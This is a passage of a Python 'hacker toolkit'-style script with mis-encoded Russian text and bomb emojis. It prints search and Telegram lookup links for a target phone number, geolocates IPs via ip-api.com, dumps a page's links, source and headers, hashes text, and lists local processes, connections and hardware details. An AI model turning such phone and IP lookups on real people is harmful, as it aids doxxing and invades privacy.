                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}8{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://t.me/{colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–û—Ç–∫—Ä—ã—Ç—å –∞–∫–∫–∞—É–Ω—Ç –≤ –¢–µ–ª–µ–≥—Ä–∞–º–º–µüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}9{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://yandex.ru/yandsearch?text={colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –ø–æ Yandexüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}10{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}https://google.ru/search?q={colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ü–æ–∏—Å–∫ –ø–æ Googleüí£')
                    print(f'{colorama.Fore.CYAN}{colorama.Style.BRIGHT}[{colorama.Fore.RED}11{colorama.Fore.CYAN}] {COLOR_CODE["URL_L"]}{COLOR_CODE["UNDERLINE"]}tel:{colorama.Fore.MAGENTA}{_user_number}{colorama.Fore.RESET}{colorama.Fore.LIGHTBLACK_EX} - üí£–ó–≤–æ–Ω–æ–∫ –Ω–∞ –Ω–æ–º–µ—Ä —Å —Ç–µ–ª–µ—Ñ–æ–Ω–∞üí£')
            else:
                print(f'{colorama.Fore.RED}[!] {colorama.Fore.YELLOW}üí£–û—à–∏–±–∫–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞!üí£{colorama.Fore.RESET}\n')

        except KeyboardInterrupt:
            print(f'\n{colorama.Fore.RED}[!] {colorama.Fore.YELLOW}üí£–í—ã–Ω—É–∂–¥–µ–Ω–Ω–∞—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ä–∞–±–æ—Ç—ã!üí£\n')
    print(colorama.Fore.RESET)
def get_info_ip(ip = '127.0.0.1'):
    try:
        response = requests.get(url=f'http://ip-api.com/json/{ip}').json()        
        data = {
            'üí£–°—Ç–∞—Ç—É—Åüí£Ô∏è': response.get('status'),
            'üí£IPüí£': response.get('query'),
            'üí£–ò–Ω—Ç–µ—Ä–Ω–µ—Ç –ø—Ä–æ–≤–∞–π–¥–µ—Äüí£': response.get('isp'),
            'üí£–û—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—èüí£': response.get('org'),
            'üí£–°—Ç—Ä–∞–Ω–∞üí£': response.get('country'),
            'üí£–†–µ–≥–∏–æ–Ωüí£': response.get('regionName'),
            'üí£–ì–æ—Ä–æ–¥üí£': response.get('city'),
            'üí£–ü–æ—á—Ç–æ–≤—ã–π –∏–Ω–¥–µ–∫—Åüí£': response.get('zip'),
            'üí£–®–∏—Ä–∏–Ω–∞üí£': response.get('lat'),
            'üí£–î–æ–ª–≥–æ—Ç–∞üí£': response.get('lon'),
            'üí£–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Åüí£': response.get('timezone'),
            'üí£ASüí£': response.get('as')
        }
        
        for k, v in data.items():
            print(f'{k} : {v}')
        
    except requests.exceptions.ConnectionError:
        print('üí£–ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ!üí£')
def parsing(URL):
        print("üí£–°–æ–¥–µ—Ä–∂–∏–º–æ–µ —Å—Å—ã–ª–∫–∏:üí£ ")
        url = f'{URL}'
        response = requests.get(url)
        url2 = response.request
        r = requests.get(url)
        tree = bs(r.text, 'html.parser')
        for link in tree.find_all('a'): 
            print(f"{link.get('href')}  üí£--->üí£  {link.text}")
        print("üí£–ö–æ–¥:üí£ ")
        print(r.text)
        print("üí£–ü–µ—á–µ–Ω—å–∫–∏:üí£ ")
        print(r.headers)
        print("üí£–ü—É—Ç—å —Å—Å—ã–ª–∫–∏:üí£ ")
        print(url2.path_url)
        print("üí£–ú–µ—Ç–æ–¥ —Å—Å—ã–ª–∫–∏:üí£ ")
        print(url2.method)
        print("üí£–°—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞ —Å—Å—ã–ª–∫–∏:üí£ ")
        print(r.status_code)
        print("üí£–û—Ç–≤–µ—Ç —Å—Å—ã–ª–∫–∏:üí£ ")
        print(r.reason)
def hashes():
    hashs = int(input("""
1. Blake2B
2. Blake2S
3. MD5
4. SHA1
5. SHA224
6. SHA256
7. SHA384
8. SHA3_224
9. SHA3_256
10. SHA3_384
11. SHA3_512
12. SHA512
13. Shake_128
14. Shake_256
üí£–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ö—ç—à–∞üí£ """))
    try:
        algorithms = {
            1: "blake2b",
            2: "blake2s",
            3: "md5",
            4: "sha1",
            5: "sha224",
            6: "sha256",
            7: "sha384",
            8: "sha3_224",
            9: "sha3_256",
            10: "sha3_384",
            11: "sha3_512",
            12: "sha512",
            13: "shake_128",
            14: "shake_256",
        }

        if hashs not in algorithms:
            print("üí£–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–π –Ω–æ–º–µ—Ä!üí£")
            return

        what_hash = input("üí£–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Çüí£")
        algorithm_name = algorithms[hashs]

        if algorithm_name.startswith("shake"):
            length = int(input("üí£–í–≤–µ–¥–∏—Ç–µ –¥–ª–∏–Ω—É —Ö—ç—à–∞(–≤ –±–∞–π—Ç–∞—Ö)üí£ "))
            hash_obj = getattr(hashlib, algorithm_name)()
            hash_obj.update(what_hash.encode())
            result = hash_obj.hexdigest(length)
        else:
            hash_obj = getattr(hashlib, algorithm_name)()
            hash_obj.update(what_hash.encode())
            result = hash_obj.hexdigest()

        print(f"üí£–†–µ–∑—É–ª—å—Ç–∞—Ç —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—èüí£ {result}")

    except:
        print(f"üí£–û—à–∏–±–∫–∞!üí£")
def get_pc():
    print("üí£–í–µ–±-–ö–∞–º–µ—Ä—ãüí£")
    camera_keywords = ['camera', 'webcam']
    for process in psutil.process_iter(['pid', 'name']):
        try:
            process_name = process.info['name'].lower()
            if any(keyword in process_name for keyword in camera_keywords):
                print(f"üí£–ü—Ä–æ—Ü–µ—Å—Å, –∏—Å–ø–æ–ª—å–∑—É—é—â–∏–π –∫–∞–º–µ—Ä—Éüí£ {process.info['name']} (PID: {process.info['pid']})")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    for conn in psutil.net_connections(kind='inet'):
        if conn.raddr:
            print(f"üí£–õ–æ–∫–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Åüí£ {conn.laddr.ip}:{conn.laddr.port}, "
                  f"üí£–£–¥–∞–ª—ë–Ω–Ω—ã–π –∞–¥—Ä–µ—Åüí£ {conn.raddr.ip}:{conn.raddr.port}, "
                  f"üí£PIDüí£ {conn.pid}")
    print("üí£–ò–Ω–æ—Ñ—Ä–º–∞—Ü–∏—è –ü–öüí£")
    for monitor in screeninfo.get_monitors():
        pc_stat = f"""üí£–í–Ω–∏–º–∞–Ω–∏–µ! –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –Ω–∞–ø–∏—Å–∞–Ω–∞ –Ω–∞ –∞–Ω–≥–ª–∏–π—Å–∫–æ–º —è–∑—ã–∫–µ!üí£
üí£RAM Totalüí£ {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GBüí£
üí£RAM Usedüí£ {psutil.virtual_memory().percent}%üí£
üí£CPU Frequencyüí£ üí£{psutil.cpu_freq().current:.2f} Mhzüí£
üí£CPU Countüí£ üí£{psutil.cpu_count()}üí£
üí£CPU Usedüí£ üí£{psutil.cpu_percent()}%üí£
üí£Python Versionüí£ üí£{platform.python_version()}üí£
üí£Python Usedüí£ üí£{psutil.Process().memory_info()[0] / 2.**30:.2f}üí£ GBüí£
üí£Display Nameüí£ üí£{monitor.name}üí£
üí£Display FullScreenüí£ üí£{monitor.width} x {monitor.height}üí£
üí£Batteryüí£ üí£{int(psutil.sensors_battery().percent)}%üí£
üí£IPüí£ üí£{requests.get(url=f'http://ip-api.com/json/').json().get('query')}üí£
üí£MACüí£ üí£{uuid.getnode()}üí£
üí£Timeüí£ üí£{time.strftime("–í—Ä–µ–º—èüí£ %H:%M:%Süí£   üí£–î–∞—Ç–∞üí£ %Y-%m-%düí£")}"""
        print(pc_stat)